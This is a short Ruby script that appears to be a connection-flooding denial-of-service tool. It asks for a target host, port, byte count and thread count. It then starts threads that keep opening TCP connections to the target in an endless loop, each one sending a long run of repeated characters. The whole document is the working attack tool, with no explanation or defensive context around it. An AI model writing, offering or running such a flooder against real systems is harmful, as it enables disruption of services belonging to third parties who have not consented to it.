require 'socket'

print 'Host> '
$host = gets.strip

print 'Port> '
$port = gets.to_i

print 'BCount> '
$bcount = gets.to_i

print 'PCount> '
pcount = gets.to_i

def flood_conn
  puts 'Flooding...'
  loop {
    c = TCPSocket.open($host, $port)
    c.puts 'h' * $bcount
  }
end

threads = Array.new

pcount.times {
  sleep 2
  threads << Thread.new {
    flood_conn()
  }
}

pcount.times {
  threads.pop.join
}
